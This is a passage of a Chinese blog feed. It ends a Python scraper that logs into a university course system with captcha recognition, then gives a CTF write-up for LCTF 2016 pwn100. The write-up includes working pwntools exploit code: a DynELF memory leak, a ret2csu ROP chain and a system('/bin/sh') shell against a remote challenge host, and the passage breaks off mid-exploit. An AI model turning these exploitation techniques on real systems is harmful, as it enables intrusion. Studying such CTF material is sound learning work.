class="keyword">else</span>:</span><br><span class="line">                encode += code[i:len(code)]</span><br><span class="line">                i = len(code)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        self.encoded = encode</span><br><span class="line">        print(<span class="string">'[+] encoded已获取!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        loginUrl = <span class="string">'http://jwgl.sdust.edu.cn/Logon.do?method=logon'</span></span><br><span class="line">        self.get_dataStr()</span><br><span class="line">        self.get_safeCode()</span><br><span class="line">        self.get_encoded()</span><br><span class="line">        login_data = &#123;</span><br><span class="line">            <span class="string">'encoded'</span>: self.encoded,</span><br><span class="line">            <span class="string">'RANDOMCODE'</span>: self.safeCode</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            html = self.seesion.post(url=loginUrl, data=login_data, headers=self.headers).content</span><br><span class="line">            <span class="keyword">if</span> html.find(<span class="string">'&lt;title&gt;学生个人中心&lt;/title&gt;'</span>) != <span class="number">-1</span>:</span><br><span class="line">                print(<span class="string">'[+] 登录成功! :)\n姓名、学号如下:'</span>)</span><br><span class="line">                pattern = <span class="string">r'&lt;div id="Top1_divLoginName" class="Nsb_top_menu_nc" style="color: #000000;"&gt;(.+?)&lt;/div&gt;'</span></span><br><span class="line">                name_num = re.findall(pattern=pattern,string=html)[<span class="number">0</span>].decode(<span class="string">'utf-8'</span>)</span><br><span class="line">                print(name_num)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> html.find(<span class="string">'&lt;font color="red"&gt;验证码无效,请重新登录!&lt;/font&gt;'</span>) != <span class="number">-1</span>:</span><br><span class="line">                print(<span class="string">'[-] 验证码输入错误 :(,请重试该程序...'</span>)</span><br><span class="line">                time.sleep(<span class="number">2</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] 登录失败 :( ,正在尝试重新登录...'</span>)</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_class_schedule</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"获得学期理论课表并展示"</span></span><br><span class="line">        class_schedule_url = <span class="string">'http://jwgl.sdust.edu.cn/jsxsd/xskb/xskb_list.do?Ves632DSdyV=NEW_XSD_PYGL'</span></span><br><span class="line">        f = open(<span class="string">'schedule.html'</span>, <span class="string">'wb'</span>)</span><br><span class="line">        html = self.seesion.get(url=class_schedule_url, headers=self.headers).content</span><br><span class="line">        f.write(html)</span><br><span class="line">        f.close()</span><br><span class="line">        webbrowser.open(<span class="string">'schedule.html'</span>)</span><br><span class="line">        <span class="comment"># os.remove('schedule.html')</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Teacher_evaluation</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"进行教师评价"</span></span><br><span class="line">        evaluation_url = <span class="string">'http://jwgl.sdust.edu.cn/jsxsd/xspj/xspj_find.do?Ves632DSdyV=NEW_XSD_JXPJ'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Robbing_class</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"抢课"</span></span><br><span class="line">        robbing_url = <span class="string">'http://jwgl.sdust.edu.cn/jsxsd/xsxkRedis/xklc_list?Ves632DSdyV=NEW_XSD_PYGL'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test = Spider()</span><br><span class="line">    test.login()</span><br><span class="line">    <span class="comment">#test.get_class_schedule()</span></span><br></pre></td></tr></table></figure><p>测试发现，这个代码对m和n的识别度较差，其他都很好，总体识别成功率还是有80%左右的。</p><h1 id="0x03-Maybe-have-more"><a href="#0x03-Maybe-have-more" class="headerlink" title="0x03 Maybe have more"></a>0x03 Maybe have more</h1><p>完成登录以后就可以嘿嘿嘿了。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/LTLKY6WF23%5B%60ND%5BK%5BO0E%60LU.gif" alt></p><p>最后吐槽一句：<code>垃圾强智系统爬爬爬</code></p>]]></content>
      <categories>
        <category>开发</category>
      </categories>
  </entry>
  <entry>
    <title>LCTF 2016 pwn100</title>
    <url>/2019/12/02/LCTF-2016-pwn100/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/starry-sky-anime-wallpaper_035411239.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><ul><li><p>这是一道很有学习价值的题目。通过这道题目,我学到了DynELF模块的用法、一些ROP技巧等。</p></li><li><p>感谢大佬们开发的各种工具、解锁的各种姿势,愿我也能站在巨人的肩膀上。</p></li></ul><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  sub_40068E();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40068E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  sub_40063D((__int64)&amp;v1, <span class="number">200</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"bye~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_40063D</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1), <span class="number">1u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>sub_40063D</code>函数就相当于一个read函数,不过必须读够200个字节且每次读一个字节,这里存在明显的栈溢出。</li><li><code>v1</code>距离<code>rbp</code>只有0x40个字节,但是却读入200个字节。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191202153812.png" alt></p><ul><li>由于程序里面并没有后门函数且题目并没有给我们libc，这就要求我们想办法获取目标系统的libc。</li></ul><blockquote><p>关于远程获取libc，pwntools在早期版本就提供了一个解决方案——DynELF类。DynELFl的官方文档见此：</p></blockquote><p><a href="http://docs.pwntools.com/en/stable/dynelf.html" target="_blank" rel="noopener">DynELFl的官方文档</a></p><blockquote><p>其具体的原理可以参阅文档和源码。简单地说，DynELF通过程序漏洞泄露出任意地址内容，结合ELF文件的结构特征获取对应版本文件并计算比对出目标符号在内存中的地址。</p></blockquote><ul><li>所以总体思路就是先通过<code>DynELF模块</code>拿到<code>system</code>函数的地址,然后想办法执行<code>system(&quot;/bin/sh&quot;);</code>。</li></ul><h1 id="0x02-通过DynELF模块泄露出system函数的地址"><a href="#0x02-通过DynELF模块泄露出system函数的地址" class="headerlink" title="0x02 通过DynELF模块泄露出system函数的地址"></a>0x02 通过DynELF模块泄露出system函数的地址</h1><ul><li><p>DynELF模块需要我们提供一个<code>leak方法</code>,而且需要程序里面有能够调用的输出函数,如<code>write、puts、printf</code>。</p></li><li><p>其实DynELF模块就相当于循环得出任意地址里的内容的一个工具。每次由这个模块自动传入一个地址,然后多次调用<code>leak(addr)</code>去泄露这个地址里面的内容,通过泄露的内容与ELF文件的结构特征比对,从而获得对应的<code>libc</code>版本,进而能获得我们的目标函数(我们搜索的函数)所在地址。</p></li></ul><h2 id="构造传统的payload"><a href="#构造传统的payload" class="headerlink" title="构造传统的payload"></a>构造传统的payload</h2><ul><li><p>基于这个思想,我们先来写一个通过溢出,让程序通过<code>puts函数</code>输出指定地址里的内容的payload。</p></li><li><p>由于<code>puts函数: int puts(const char *s)</code>只有一个参数,这个参数就是我们所要输出的内容所在的地址,<code>64位程序的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中,第七个及以后的参数才保存在栈中</code>。所以<code>puts函数</code>的参数需要保存到<code>RDI</code>中。</p></li><li><p>所以我们需要先通过<code>ROPgadget</code>找到<code>pop rdi;ret</code>的地址。</p></li><li><p>如果不太清楚为什么这么做的话,可以看我的另一篇博客,里面有很详细的讲解及调试。</p></li></ul><p><a href="http://liul14n.top/2019/08/04/Bugku-Pwn4/">传送门</a></p><ul><li><p>具体命令为:<code>ROPgadget --binary pwn100 --only &#39;pop|ret&#39; | grep rdi</code>。得到结果<code>0x0000000000400763 : pop rdi ; ret</code>。</p></li><li><p>有了<code>pop rdi ; ret</code>以后,我们就可以任选一个想输出其内容的地址来构造我们的payload了。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c = process(<span class="string">'./pwm100'</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn100"</span>)</span><br><span class="line">puts_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400763</span></span><br><span class="line">payload = <span class="string">"A"</span> *(<span class="number">0x40</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x400000</span>) <span class="comment">#任选的</span></span><br><span class="line">payload += p64(puts_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line">c.send(payload)</span><br><span class="line"><span class="keyword">print</span> c.recv()</span><br></pre></td></tr></table></figure><h2 id="由传统payload转成leak方法"><a href="#由传统payload转成leak方法" class="headerlink" title="由传统payload转成leak方法"></a>由传统payload转成leak方法</h2><ul><li>理解了这个payload的原理以后,我们就可以去构造我们需要的<code>leak方法</code>了。</li></ul><h3 id="小难点1"><a href="#小难点1" class="headerlink" title="小难点1"></a>小难点1</h3><ul><li><p>前面我们也提到过了, 我们的<code>leak方法</code>必须能够多次被调用。</p></li><li><p>能被多次调用也就意味着我们的栈空间要跟第一次调用的时候基本保持一致,如果不一致,最先导致的一个问题就是参数传递问题,可能在传递和调用过程中,栈空间就被消耗完了。</p></li><li><p>所以这里我们把调用完<code>puts</code>以后的返回地址修改成<code>start</code>,这个函数在IDA里面能够看到。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191202161336.png" alt></p><blockquote><p>这是一段编译器添加的代码,用于初始化程序的运行环境后，执行完相应的代码后会跳转到程序的入口函数<code>main函数</code>去运行程序代码。</p></blockquote><ul><li>也就是说,我们通过每次返回到<code>start函数</code>就能实现每次相当于重新加载程序的效果。</li></ul><h3 id="小难点2"><a href="#小难点2" class="headerlink" title="小难点2"></a>小难点2</h3><ul><li>由于这道题目我们能够利用的<code>puts</code>函数的输出长度是不受控制的,它遇到<code>\x00</code>才会停止输出。所以我们需要自行添加上<code>\x00</code>。</li></ul><h3 id="leak方法"><a href="#leak方法" class="headerlink" title="leak方法"></a>leak方法</h3><ul><li>克服了几个小困难以后我们得到<code>leak方法</code>。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">       count = <span class="number">0</span></span><br><span class="line">       up = <span class="string">''</span></span><br><span class="line">       content = <span class="string">''</span></span><br><span class="line">       payload = <span class="string">'A'</span>*(<span class="number">0x40</span> + <span class="number">8</span>)            <span class="comment">#padding</span></span><br><span class="line">       payload += p64(pop_rdi)             <span class="comment">#将puts的参数传给rdi</span></span><br><span class="line">       payload += p64(addr)                <span class="comment">#puts的参数</span></span><br><span class="line">       payload += p64(puts_addr)           <span class="comment">#调用puts()函数</span></span><br><span class="line">       payload += p64(start_addr)          <span class="comment">#跳转到start，恢复栈</span></span><br><span class="line">       payload = payload.ljust(<span class="number">200</span>, <span class="string">'B'</span>)   <span class="comment">#padding,因为需要读满200</span></span><br><span class="line">       io.send(payload)</span><br><span class="line">       io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:                                                      <span class="comment">#无限循环读取，防止recv()读取输出不全</span></span><br><span class="line">              c = io.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.1</span>)     <span class="comment">#每次读取一个字节，设置超时时间确保没有遗漏</span></span><br><span class="line">              count += <span class="number">1</span>                                            </span><br><span class="line">              <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:                  <span class="comment">#上一个字符是回车且读不到其他字符，说明读完了</span></span><br><span class="line">                     content = content[:<span class="number">-1</span>]+<span class="string">'\x00'</span>    <span class="comment">#最后一个字符置为\x00</span></span><br><span class="line">                     <span class="keyword">break</span></span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                     content += c <span class="comment">#拼接输出</span></span><br><span class="line">                     up = c    <span class="comment">#保存最后一个字符</span></span><br><span class="line">       content = content[:<span class="number">4</span>]   <span class="comment">#截取输出的一段作为返回值，提供给DynELF处理</span></span><br><span class="line">       log.info(<span class="string">"%#x =&gt; %s"</span> % (addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">       <span class="keyword">return</span> content</span><br></pre></td></tr></table></figure><ul><li>仔细想一想,我们可以发现,这个<code>leak方法</code>其实就是一个模板, 我们只需要提供溢出payload然后稍作改动就行,大体代码不变。</li></ul><h3 id="泄露system函数地址"><a href="#泄露system函数地址" class="headerlink" title="泄露system函数地址"></a>泄露system函数地址</h3><ul><li>我们有了<code>leak方法</code>以后还需要实例化一个DynELF对象,用这个对象去泄露我们的<code>system函数地址</code>。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">sys_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">log.info(<span class="string">"system_addr =&gt; %#x"</span>, sys_addr)</span><br></pre></td></tr></table></figure><ul><li><p>这样我们就能够拿到<code>system函数地址了</code>。</p></li><li><p>所以泄露<code>system函数</code>的完整代码为:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">32873</span>)<span class="comment">#端口要根据自己创建的环境来。</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn100"</span>)</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">pop_rdi = <span class="number">0x400763</span></span><br><span class="line">puts_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">       count = <span class="number">0</span></span><br><span class="line">       up = <span class="string">''</span></span><br><span class="line">       content = <span class="string">''</span></span><br><span class="line">       payload = <span class="string">'A'</span>*(<span class="number">0x40</span> + <span class="number">8</span>)            <span class="comment">#padding</span></span><br><span class="line">       payload += p64(pop_rdi)             <span class="comment">#将puts的参数传给rdi</span></span><br><span class="line">       payload += p64(addr)                <span class="comment">#puts的参数</span></span><br><span class="line">       payload += p64(puts_addr)           <span class="comment">#调用puts()函数</span></span><br><span class="line">       payload += p64(start_addr)          <span class="comment">#跳转到start，恢复栈</span></span><br><span class="line">       payload = payload.ljust(<span class="number">200</span>, <span class="string">'B'</span>)   <span class="comment">#padding,因为需要读满200</span></span><br><span class="line">       io.send(payload)</span><br><span class="line">       io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:                                                      <span class="comment">#无限循环读取，防止recv()读取输出不全</span></span><br><span class="line">              c = io.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.1</span>)     <span class="comment">#每次读取一个字节，设置超时时间确保没有遗漏</span></span><br><span class="line">              count += <span class="number">1</span>                                            </span><br><span class="line">              <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:                  <span class="comment">#上一个字符是回车且读不到其他字符，说明读完了</span></span><br><span class="line">                     content = content[:<span class="number">-1</span>]+<span class="string">'\x00'</span>    <span class="comment">#最后一个字符置为\x00</span></span><br><span class="line">                     <span class="keyword">break</span></span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                     content += c <span class="comment">#拼接输出</span></span><br><span class="line">                     up = c    <span class="comment">#保存最后一个字符</span></span><br><span class="line">       content = content[:<span class="number">4</span>]   <span class="comment">#截取输出的一段作为返回值，提供给DynELF处理</span></span><br><span class="line">       log.info(<span class="string">"%#x =&gt; %s"</span> % (addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">       <span class="keyword">return</span> content</span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">sys_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">log.info(<span class="string">"system_addr =&gt; %#x"</span>, sys_addr)</span><br></pre></td></tr></table></figure><ul><li>运行可得<code>system_addr</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191202162634.png" alt></p><ul><li>从运行结果来看,我们也能明白<code>DynELF模块</code>大致的工作原理。</li></ul><h1 id="0x03-ROP"><a href="#0x03-ROP" class="headerlink" title="0x03 ROP"></a>0x03 ROP</h1><h2 id="获得-bin-sh"><a href="#获得-bin-sh" class="headerlink" title="获得/bin/sh"></a>获得/bin/sh</h2><ul><li><p>有了<code>system函数</code>以后,还需要有它的参数<code>/bin/sh</code>。</p></li><li><p>我们可以找到一个具有读写权限的地址,写入<code>/bin/sh</code>。</p></li><li><p>通过<code>vmmap</code>命令或者在IDA里面找<code>bss段</code>等都可以找到合适的地址。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191202165027.png" alt></p><ul><li><p>我们发现<code>0x601000</code>到<code>0x602000</code>之间的地址都具有读写权限。</p></li><li><p>我们任选一个地址<code>binsh_addr = 0x601500</code>用于写入<code>/bin/sh</code>。</p></li><li><p>我们需要构造ROP链来实现写入<code>/bin/sh</code>。</p></li><li><p>由于我们的<code>read函数: read(int fd, void *buf, size_t count)</code>,有三个参数,所以我们采用的gadgets为:</p></li><li><p><code>gadget1(0x40075A)</code>:</p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text 000000000040075A                 pop     rbx</span><br><span class="line">.text:000000000040075B                 pop     rbp</span><br><span class="line">.text:000000000040075C                 pop     r12</span><br><span class="line">.text:000000000040075E                 pop     r13</span><br><span class="line">.text:0000000000400760                 pop     r14</span><br><span class="line">.text:0000000000400762                 pop     r15</span><br><span class="line">.text:0000000000400764                 retn</span><br></pre></td></tr></table></figure><ul><li><code>gadget2(0x400740)</code>:</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text 0000000000400740 loc_400740:</span><br><span class="line">.text:0000000000400740                 mov     rdx, r13</span><br><span class="line">.text:0000000000400743                 mov     rsi, r14</span><br><span class="line">.text:0000000000400746                 mov     edi, r15d</span><br><span class="line">.text:0000000000400749                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040074D                 add     rbx, 1</span><br><span class="line">.text:0000000000400751                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400754                 jnz     short loc_400740</span><br><span class="line">.text:0000000000400756</span><br><span class="line">.text:0000000000400756 loc_400756:</span><br><span class="line">.text:0000000000400756                 add     rsp, 8</span><br><span class="line">.text:000000000040075A                 pop     rbx</span><br><span class="line">.text:000000000040075B                 pop     rbp</span><br><span class="line">.text:000000000040075C                 pop     r12</span><br><span class="line">.text:000000000040075E                 pop     r13</span><br><span class="line">.text:0000000000400760                 pop     r14</span><br><span class="line">.text:0000000000400762                 pop     r15</span><br><span class="line">.text:0000000000400764                 retn</span><br></pre></td></tr></table></figure><ul><li>这是<code>__libc_csu_init函数的通用gadget</code>。通过这两段gadget,我们能发现这么一个关系。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">r13 == rdx == arg3</span><br><span class="line">r14 == rsi == arg2</span><br><span class="line">r15d == edi == arg1</span><br><span class="line">r12 == call address</span><br></pre></td></tr></table></figure><ul><li>所以得到。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text 000000000040075A       pop     rbx  必须为0</span><br><span class="line">.text:000000000040075B       pop     rbp  必须为1</span><br><span class="line">.text:000000000040075C       pop     r12  call address,即我们需要调用的函数的地址</span><br><span class="line">.text:000000000040075E       pop     r13  调用的函数的参数3</span><br><span class="line">.text:0000000000400760       pop     r14  调用的函数的参数2</span><br><span class="line">.text:0000000000400762       pop     r15  调用的函数的参数1</span><br><span class="line">.text:0000000000400764       retn         我们需要返回到gadget2</span><br><span class="line">                                          因为参数真正传给rdi、rsi、rdx是在gadget2</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text 0000000000400740 loc_400740:</span><br><span class="line">.text:0000000000400740            mov     rdx, r13</span><br><span class="line">.text:0000000000400743            mov     rsi, r14</span><br><span class="line">.text:0000000000400746            mov     edi, r15d</span><br><span class="line">.text:0000000000400749            call    qword ptr [r12+rbx*8] 调用</span><br><span class="line">.text:000000000040074D            add     rbx, 1</span><br><span class="line">.text:0000000000400751            cmp     rbx, rbp</span><br><span class="line">.text:0000000000400754            jnz     short loc_400740</span><br><span class="line">.text:0000000000400756</span><br><span class="line">.text:0000000000400756 loc_400756:</span><br><span class="line">.text:0000000000400756            add     rsp, 8</span><br><span class="line">.text:000000000040075A            pop     rbx</span><br><span class="line">.text:000000000040075B            pop     rbp</span><br><span class="line">.text:000000000040075C            pop     r12</span><br><span class="line">.text:000000000040075E            pop     r13</span><br><span class="line">.text:0000000000400760            pop     r14</span><br><span class="line">.text:0000000000400762            pop     r15</span><br><span class="line">.text:0000000000400764            retn</span><br></pre></td></tr></table></figure><ul><li>从而我们的ROP链为:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">'A'</span>*(<span class="number">0x40</span> + <span class="number">8</span>)</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)           <span class="comment">#rbx=0</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)           <span class="comment">#rbp=1  </span></span><br><span class="line">payload+=p64(read_got)    <span class="comment">#call  read()</span></span><br><span class="line">payload+=p64(<span class="number">8</span>)           <span class="comment">#size</span></span><br><span class="line">payload+=p64(binsh_addr)  <span class="comment">#buf</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)           <span class="comment">#stdin</span></span><br><span class="line">payload+=p64(gadget2)     <span class="comment">#ret to gadget2</span></span><br><span class="line">payload+=<span class="string">'\x00'</span>*<span class="number">56</span>        <span class="comment">#注意这里。</span></span><br><span class="line">payload+=p64(start_addr)  <span class="comment">#ret to start_addr</span></span><br><span class="line">payload=payload.ljust(<span class="number">200</span>,<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure><ul><li><p>上方payload中有一处 <code>payload+=&#39;\x00&#39;*56</code>, 这里相当于计算了一下<code>RSP</code>与<code>RIP</code>的偏移。</p></li><li><p>由于我们的<code>gadget2</code>中在调用完<code>call qword ptr [r12+rbx*8]</code>后,<code>RSP</code>是指向<code>ret_addr</code>的,然后我们会执行这一系列指令。</p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400756            add     rsp, 8</span><br><span class="line">.text:000000000040075A            pop     rbx</span><br><span class="line">.text:000000000040075B            pop     rbp</span><br><span class="line">.text:000000000040075C            pop     r12</span><br><span class="line">.text:000000000040075E            pop     r13</span><br><span class="line">.text:0000000000400760            pop     r14</span><br><span class="line">.text:0000000000400762            pop     r15</span><br></pre></td></tr></table></figure><ul><li><p>首先<code>add指令</code>导致<code>rsp += 8</code>, 然后有6个<code>pop</code>,每次<code>pop</code>都会导致<code>rsp += 8</code>,也就是<code>rsp</code>一共加了<code>(1+6)*8 = 56</code>个字节。</p></li><li><p>所以我们要在距离调用完<code>call qword ptr [r12+rbx*8]</code>后的<code>56</code>个字节的位置放置我们真正的<code>ret_addr</code>。</p></li></ul><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><ul><li>剩下的就是另一个ROP链了:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">"A"</span>*(<span class="number">0x40</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br></pre></td></tr></table></figure><ul><li>所以我们完整的exp为:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">32873</span>)</span><br><span class="line"><span class="comment">#io = process("./pwn100")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn100"</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x40075A</span> <span class="comment">#pop rbx_rbp_r12_r13_r14_r15</span></span><br><span class="line">gadget2 = <span class="number">0x400740</span> <span class="comment">#rdx(r13), rsi(r14), edi(r15d)</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400763</span></span><br><span class="line"><span class="comment"># start_addr = elf.symbols['_start']</span></span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">binsh_addr = <span class="number">0x601500</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">  payload = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">  payload = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">  io.send(payload)</span><br><span class="line">  io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line">  content = <span class="string">""</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = io.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:</span><br><span class="line">        content = content[:<span class="number">-1</span>] + <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content += c</span><br><span class="line">        up = c</span><br><span class="line">  content = content[:<span class="number">4</span>]</span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">sys_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">log.info(<span class="string">"system_addr =&gt; %#x"</span>, sys_addr)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span> * <span 